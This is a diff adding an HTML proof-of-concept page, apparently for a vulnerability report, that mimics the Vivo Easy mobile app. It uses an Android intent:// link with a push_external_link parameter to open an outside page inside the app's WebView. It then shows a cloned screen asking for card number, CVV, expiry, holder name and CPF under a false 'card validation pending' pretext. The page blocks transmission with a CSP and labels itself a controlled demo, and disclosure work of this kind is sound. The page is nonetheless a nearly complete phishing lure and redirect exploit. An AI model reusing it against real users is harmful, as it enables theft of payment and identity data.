@@ -1,0 +1,774 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="color-scheme" content="light">
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'; frame-src 'none'">
+  <title>PoC controlada — atualização de pagamento</title>
+  <style>
+    :root {
+      --vivo-purple: #660099;
+      --vivo-purple-bright: #7800a8;
+      --vivo-purple-soft: #cfa9df;
+      --ink: #171717;
+      --muted: #777;
+      --field: #ededed;
+      --line: #dedede;
+      --warning-bg: #fff5dc;
+      --warning-border: #efb625;
+      --safe-bg: #24152d;
+      font-family: Arial, Helvetica, sans-serif;
+      color: var(--ink);
+      background: #fff;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      min-height: 100%;
+      margin: 0;
+    }
+
+    body {
+      background: #fff;
+    }
+
+    button,
+    input,
+    a {
+      font: inherit;
+    }
+
+    button,
+    a.button {
+      min-height: 52px;
+      border: 0;
+      border-radius: 13px;
+      cursor: pointer;
+      font-weight: 700;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .poc-ribbon {
+      position: fixed;
+      z-index: 100;
+      right: 10px;
+      bottom: max(10px, env(safe-area-inset-bottom));
+      left: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 34px;
+      padding: 7px 12px;
+      border-radius: 9px;
+      background: var(--safe-bg);
+      color: #fff;
+      box-shadow: 0 7px 22px rgb(0 0 0 / 25%);
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: .04em;
+      text-align: center;
+      text-transform: uppercase;
+    }
+
+    /* Página aberta inicialmente no Chrome. */
+    .landing {
+      display: grid;
+      min-height: 100vh;
+      padding: 24px;
+      place-items: center;
+      background:
+        radial-gradient(circle at 85% 10%, rgb(140 0 180 / 14%), transparent 28%),
+        linear-gradient(160deg, #faf7fc 0%, #fff 55%);
+    }
+
+    .landing-card {
+      width: min(100%, 430px);
+      overflow: hidden;
+      border: 1px solid #e3d9e9;
+      border-radius: 22px;
+      background: #fff;
+      box-shadow: 0 22px 70px rgb(60 20 80 / 16%);
+    }
+
+    .landing-brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 22px 24px;
+      background: var(--vivo-purple);
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    .brand-dot {
+      width: 32px;
+      height: 32px;
+      border: 7px solid #fff;
+      border-radius: 50%;
+    }
+
+    .landing-content {
+      padding: 27px 24px 25px;
+    }
+
+    .alert-icon {
+      display: grid;
+      width: 52px;
+      height: 52px;
+      margin-bottom: 18px;
+      border: 2px solid var(--warning-border);
+      border-radius: 50%;
+      color: #9a6500;
+      font-size: 29px;
+      font-weight: 700;
+      place-items: center;
+    }
+
+    .landing h1 {
+      margin: 0 0 13px;
+      font-size: 27px;
+      line-height: 1.12;
+    }
+
+    .landing p {
+      margin: 0;
+      color: #49434d;
+      font-size: 17px;
+      line-height: 1.55;
+    }
+
+    .landing .deadline {
+      margin-top: 13px;
+      font-weight: 700;
+    }
+
+    .landing a.button {
+      display: grid;
+      width: 100%;
+      margin-top: 25px;
+      padding: 0 20px;
+      background: var(--vivo-purple);
+      color: #fff;
+      text-align: center;
+      text-decoration: none;
+      place-items: center;
+    }
+
+    .landing-note {
+      margin-top: 17px !important;
+      color: var(--muted) !important;
+      font-size: 12px !important;
+      text-align: center;
+    }
+
+    /* Conteúdo renderizado no WebView interno. */
+    .app-shell {
+      min-height: 100vh;
+      padding: 20px 18px 108px;
+      background: #fff;
+    }
+
+    .app-header {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 72px;
+      margin-bottom: 24px;
+    }
+
+    .back {
+      position: absolute;
+      left: 5px;
+      display: block;
+      width: 24px;
+      height: 24px;
+      border-bottom: 3px solid #111;
+      border-left: 3px solid #111;
+      transform: rotate(45deg);
+    }
+
+    .app-header h1 {
+      margin: 0;
+      font-size: clamp(29px, 9vw, 43px);
+      font-weight: 400;
+    }
+
+    .warning-panel {
+      margin: 0 auto 20px;
+      padding: 18px;
+      border: 1px solid #f0d17b;
+      border-left: 5px solid var(--warning-border);
+      border-radius: 14px;
+      background: var(--warning-bg);
+    }
+
+    .warning-panel strong {
+      display: block;
+      margin-bottom: 7px;
+      color: #563900;
+      font-size: 19px;
+    }
+
+    .warning-panel p {
+      margin: 0;
+      color: #654e24;
+      font-size: 15px;
+      line-height: 1.45;
+    }
+
+    .card-summary {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 132px;
+      padding: 23px;
+      border: 1px solid var(--line);
+      border-radius: 13px;
+      background: #fff;
+      box-shadow: 0 2px 7px rgb(0 0 0 / 10%);
+    }
+
+    .card-state {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--vivo-purple);
+      font-size: 17px;
+      font-weight: 800;
+    }
+
+    .radio-ring {
+      width: 23px;
+      height: 23px;
+      border: 3px solid var(--vivo-purple);
+      border-radius: 50%;
+      box-shadow: inset 0 0 0 4px #fff;
+      background: var(--vivo-purple);
+    }
+
+    .card-status {
+      margin-top: 14px;
+      color: #555;
+      font-size: 18px;
+    }
+
+    .card-status b {
+      color: #a44500;
+    }
+
+    .mastercard {
+      position: relative;
+      width: 54px;
+      height: 34px;
+    }
+
+    .mastercard::before,
+    .mastercard::after {
+      position: absolute;
+      top: 3px;
+      width: 29px;
+      height: 29px;
+      border-radius: 50%;
+      content: "";
+    }
+
+    .mastercard::before {
+      left: 2px;
+      background: #e4002b;
+    }
+
+    .mastercard::after {
+      right: 2px;
+      background: #ff9f1a;
+      opacity: .92;
+    }
+
+    .primary-action {
+      position: fixed;
+      z-index: 5;
+      right: 18px;
+      bottom: 58px;
+      left: 18px;
+      width: calc(100% - 36px);
+      background: var(--vivo-purple-bright);
+      color: #fff;
+    }
+
+    .sheet-backdrop {
+      position: fixed;
+      z-index: 20;
+      inset: 0;
+      display: flex;
+      align-items: flex-end;
+      background: rgb(0 0 0 / 38%);
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .2s ease;
+    }
+
+    .sheet-backdrop.open {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .sheet {
+      width: 100%;
+      max-height: calc(100vh - 56px);
+      overflow-y: auto;
+      padding: 28px 16px 75px;
+      border-radius: 22px 22px 0 0;
+      background: #fff;
+      transform: translateY(30px);
+      transition: transform .2s ease;
+    }
+
+    .sheet-backdrop.open .sheet {
+      transform: translateY(0);
+    }
+
+    .close-sheet {
+      display: block;
+      width: 38px;
+      min-height: 38px;
+      margin: -8px 0 4px auto;
+      background: transparent;
+      color: #111;
+      font-size: 39px;
+      font-weight: 300;
+      line-height: 1;
+    }
+
+    .sheet h2 {
+      max-width: 330px;
+      margin: 0 auto 24px;
+      font-size: clamp(31px, 9vw, 43px);
+      font-weight: 400;
+      line-height: 1.04;
+      text-align: center;
+    }
+
+    .demo-tools {
+      margin-bottom: 18px;
+      padding: 12px;
+      border: 1px dashed #7e4f91;
+      border-radius: 11px;
+      background: #faf5fc;
+      color: #4d275c;
+      font-size: 12px;
+      line-height: 1.4;
+    }
+
+    .demo-tools button {
+      min-height: 38px;
+      margin-top: 9px;
+      padding: 0 13px;
+      border: 1px solid var(--vivo-purple);
+      background: #fff;
+      color: var(--vivo-purple);
+      font-size: 12px;
+    }
+
+    .field {
+      margin-bottom: 16px;
+    }
+
+    .field-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    label {
+      display: block;
+      margin: 0 0 6px 2px;
+      font-size: 17px;
+      line-height: 1.25;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      min-height: 58px;
+      padding: 0 15px;
+      border: 2px solid transparent;
+      border-radius: 15px;
+      outline: none;
+      background: var(--field);
+      color: #111;
+      font-size: 20px;
+    }
+
+    input[type="text"]:focus {
+      border-color: var(--vivo-purple-bright);
+      background: #fff;
+    }
+
+    input::placeholder {
+      color: #999;
+    }
+
+    .consent {
+      display: grid;
+      grid-template-columns: 22px 1fr;
+      gap: 10px;
+      align-items: start;
+      margin: 18px 2px;
+      color: #555;
+      font-size: 13px;
+    }
+
+    .consent input {
+      width: 20px;
+      height: 20px;
+      accent-color: var(--vivo-purple);
+    }
+
+    .submit-card {
+      width: 100%;
+      background: var(--vivo-purple-bright);
+      color: #fff;
+    }
+
+    .submit-card:disabled {
+      background: var(--vivo-purple-soft);
+      color: rgb(255 255 255 / 55%);
+      cursor: not-allowed;
+    }
+
+    .proof {
+      position: fixed;
+      z-index: 80;
+      inset: 0;
+      display: grid;
+      padding: 25px;
+      background: rgb(29 10 38 / 92%);
+      place-items: center;
+    }
+
+    .proof-card {
+      width: min(100%, 430px);
+      padding: 27px 23px;
+      border-radius: 18px;
+      background: #fff;
+      box-shadow: 0 20px 60px rgb(0 0 0 / 35%);
+    }
+
+    .proof-card h2 {
+      margin: 0 0 12px;
+      color: var(--vivo-purple);
+      font-size: 25px;
+    }
+
+    .proof-card p,
+    .proof-card li {
+      color: #403648;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .proof-card code {
+      overflow-wrap: anywhere;
+    }
+
+    .proof-card button {
+      width: 100%;
+      margin-top: 15px;
+      background: var(--vivo-purple);
+      color: #fff;
+    }
+
+    @media (min-width: 600px) {
+      .app-shell {
+        width: 430px;
+        margin: 0 auto;
+        border-right: 1px solid #eee;
+        border-left: 1px solid #eee;
+      }
+
+      .sheet {
+        width: 430px;
+        margin: 0 auto;
+      }
+
+      .primary-action {
+        right: calc(50% - 197px);
+        left: calc(50% - 197px);
+        width: 394px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main id="landing" class="landing hidden" aria-labelledby="landing-title">
+    <section class="landing-card">
+      <div class="landing-brand">
+        <span class="brand-dot" aria-hidden="true"></span>
+        <span>Vivo Easy</span>
+      </div>
+      <div class="landing-content">
+        <div class="alert-icon" aria-hidden="true">!</div>
+        <h1 id="landing-title">Atualização do método de pagamento</h1>
+        <p>
+          Identificamos uma pendência na validação do seu cartão cadastrado.
+          Para evitar a interrupção da renovação automática do seu plano,
+          atualize o método de pagamento até a próxima data de cobrança.
+        </p>
+        <p class="deadline">A atualização leva menos de dois minutos.</p>
+        <a id="launch-app" class="button" href="#">Atualizar método de pagamento</a>
+        <p class="landing-note">Demonstração autorizada: o botão abre o aplicativo instalado.</p>
+      </div>
+    </section>
+  </main>
+
+  <main id="webview" class="app-shell hidden" aria-labelledby="cards-title">
+    <header class="app-header">
+      <span class="back" aria-hidden="true"></span>
+      <h1 id="cards-title">Meus cartões</h1>
+    </header>
+
+    <section class="warning-panel" aria-label="Pendência no cartão">
+      <strong>Não foi possível validar seu cartão</strong>
+      <p>
+        Cadastre novamente o método de pagamento para evitar a interrupção
+        da renovação automática do plano.
+      </p>
+    </section>
+
+    <section class="card-summary" aria-label="Cartão com pendência">
+      <div>
+        <div class="card-state">
+          <span class="radio-ring" aria-hidden="true"></span>
+          CARTÃO PRINCIPAL
+        </div>
+        <div class="card-status"><b>Validação pendente</b></div>
+      </div>
+      <span class="mastercard" aria-label="Mastercard"></span>
+    </section>
+
+    <button id="open-sheet" class="primary-action" type="button">
+      Cadastrar novo cartão
+    </button>
+  </main>
+
+  <div id="sheet-backdrop" class="sheet-backdrop hidden" aria-hidden="true">
+    <section class="sheet" role="dialog" aria-modal="true" aria-labelledby="sheet-title">
+      <button id="close-sheet" class="close-sheet" type="button" aria-label="Fechar">×</button>
+      <h2 id="sheet-title">Cadastrar novo cartão de crédito</h2>
+
+      <div class="demo-tools">
+        <strong>PoC controlada.</strong> Não utilize dados reais. O navegador está impedido
+        pela CSP de enviar formulário ou fazer conexões de saída.
+        <br>
+        <button id="fill-demo" type="button">Preencher dados fictícios</button>
+      </div>
+
+      <form id="card-form" action="" method="post" autocomplete="off">
+        <div class="field">
+          <label for="card-number">Número do cartão</label>
+          <input id="card-number" name="demo_card" type="text" inputmode="numeric"
+                 maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off"
+                 data-lpignore="true" required>
+        </div>
+
+        <div class="field-row">
+          <div class="field">
+            <label for="expiry">Data de validade</label>
+            <input id="expiry" name="demo_expiry" type="text" inputmode="numeric"
+                   maxlength="5" placeholder="MM/AA" autocomplete="off" required>
+          </div>
+          <div class="field">
+            <label for="cvv">CVV ⓘ</label>
+            <input id="cvv" name="demo_cvv" type="text" inputmode="numeric"
+                   maxlength="4" placeholder="000" autocomplete="off" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="holder">Nome do titular como está no cartão ⓘ</label>
+          <input id="holder" name="demo_holder" type="text" maxlength="80"
+                 placeholder="NOME FICTÍCIO" autocomplete="off" required>
+        </div>
+
+        <div class="field">
+          <label for="cpf">CPF do titular do cartão</label>
+          <input id="cpf" name="demo_cpf" type="text" inputmode="numeric"
+                 maxlength="14" placeholder="000.000.000-00" autocomplete="off" required>
+        </div>
+
+        <label class="consent" for="dummy-only">
+          <input id="dummy-only" type="checkbox" required>
+          <span>Confirmo que estou utilizando somente os dados fictícios desta PoC.</span>
+        </label>
+
+        <button id="submit-card" class="submit-card" type="submit" disabled>
+          Confirmar cadastro do cartão
+        </button>
+      </form>
+    </section>
+  </div>
+
+  <section id="proof" class="proof hidden" role="dialog" aria-modal="true" aria-labelledby="proof-title">
+    <div class="proof-card">
+      <h2 id="proof-title">PoC concluída</h2>
+      <p>
+        O formulário controlado foi renderizado dentro do aplicativo legítimo e
+        recebeu os dados fictícios digitados pelo pesquisador.
+      </p>
+      <ul>
+        <li>Origem controlada: <code id="proof-origin"></code></li>
+        <li>WebView detectado: <strong id="proof-webview"></strong></li>
+        <li>Canário local: <code id="proof-nonce"></code></li>
+        <li>Nenhum valor foi armazenado ou transmitido.</li>
+      </ul>
+      <button id="close-proof" type="button">Encerrar demonstração</button>
+    </div>
+  </section>
+
+  <aside class="poc-ribbon" aria-label="Aviso de prova de conceito">
+    PoC controlada · não inserir dados reais · sem transmissão
+  </aside>
+
+  <script>
+    (() => {
+      "use strict";
+
+      const byId = (id) => document.getElementById(id);
+      const params = new URLSearchParams(window.location.search);
+      const webviewMode = params.get("mode") === "webview";
+
+      const landing = byId("landing");
+      const webview = byId("webview");
+      const sheetBackdrop = byId("sheet-backdrop");
+      const form = byId("card-form");
+      const submit = byId("submit-card");
+
+      if (webviewMode) {
+        webview.classList.remove("hidden");
+        sheetBackdrop.classList.remove("hidden");
+      } else {
+        landing.classList.remove("hidden");
+
+        const payload = new URL(window.location.href);
+        payload.search = "?mode=webview";
+        payload.hash = "";
+
+        const intent = [
+          "intent://open/#Intent",
+          "scheme=vivoeasy",
+          "package=br.com.vivo.vivoeasy",
+          "action=android.intent.action.VIEW",
+          `S.push_external_link=https%3A%2F%19t0u7.github.io/o.html;`,
+          "S.push_type=REDIRECT_EXTERNAL_LINK",
+          "end"
+        ].join(";");
+
+        byId("launch-app").href = intent;
+      }
+
+      const openSheet = () => {
+        sheetBackdrop.classList.add("open");
+        sheetBackdrop.setAttribute("aria-hidden", "false");
+        window.setTimeout(() => byId("card-number").focus(), 220);
+      };
+
+      const closeSheet = () => {
+        sheetBackdrop.classList.remove("open");
+        sheetBackdrop.setAttribute("aria-hidden", "true");
+      };
+
+      byId("open-sheet").addEventListener("click", openSheet);
+      byId("close-sheet").addEventListener("click", closeSheet);
+
+      const digits = (value) => value.replace(/\D/g, "");
+
+      byId("card-number").addEventListener("input", (event) => {
+        event.target.value = digits(event.target.value)
+          .slice(0, 16)
+          .replace(/(.{4})/g, "$1 ")
+          .trim();
+        updateSubmit();
+      });
+
+      byId("expiry").addEventListener("input", (event) => {
+        const value = digits(event.target.value).slice(0, 4);
+        event.target.value = value.length > 2
+          ? `${value.slice(0, 2)}/${value.slice(2)}`
+          : value;
+        updateSubmit();
+      });
+
+      byId("cvv").addEventListener("input", (event) => {
+        event.target.value = digits(event.target.value).slice(0, 4);
+        updateSubmit();
+      });
+
+      byId("cpf").addEventListener("input", (event) => {
+        const value = digits(event.target.value).slice(0, 11);
+        event.target.value = value
+          .replace(/^(\d{3})(\d)/, "$1.$2")
+          .replace(/^(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
+          .replace(/\.(\d{3})(\d)/, ".$1-$2");
+        updateSubmit();
+      });
+
+      byId("holder").addEventListener("input", updateSubmit);
+      byId("dummy-only").addEventListener("change", updateSubmit);
+
+      function updateSubmit() {
+        const complete =
+          digits(byId("card-number").value).length === 16 &&
+          digits(byId("expiry").value).length === 4 &&
+          digits(byId("cvv").value).length >= 3 &&
+          byId("holder").value.trim().length >= 3 &&
+          digits(byId("cpf").value).length === 11 &&
+          byId("dummy-only").checked;
+        submit.disabled = !complete;
+      }
+
+      byId("fill-demo").addEventListener("click", () => {
+        byId("card-number").value = "4242 4242 4242 4242";
+        byId("expiry").value = "12/34";
+        byId("cvv").value = "123";
+        byId("holder").value = "PESSOA DE TESTE";
+        byId("cpf").value = "000.000.000-00";
+        byId("dummy-only").checked = true;
+        updateSubmit();
+      });
+
+      form.addEventListener("submit", (event) => {
+        event.preventDefault();
+        if (submit.disabled) return;
+
+        const nonce = window.crypto?.randomUUID?.()
+          ?? `poc-${Date.now().toString(36)}`;
+        const looksLikeWebView = /; wv\)|\bwv\b|Version\/\d+\.\d+ Chrome\//i
+          .test(navigator.userAgent);
+
+        /* Limpa imediatamente todos os valores; nada é logado ou persistido. */
+        form.reset();
+        updateSubmit();
+
+        byId("proof-origin").textContent = window.location.origin;
+        byId("proof-webview").textContent = looksLikeWebView ? "sim" : "não identificado";
+        byId("proof-nonce").textContent = nonce;
+        byId("proof").classList.remove("hidden");
+      });
+
+      byId("close-proof").addEventListener("click", () => {
+        byId("proof").classList.add("hidden");
+        closeSheet();
+      });
+    })();
+  </script>
+</body>
+</html>
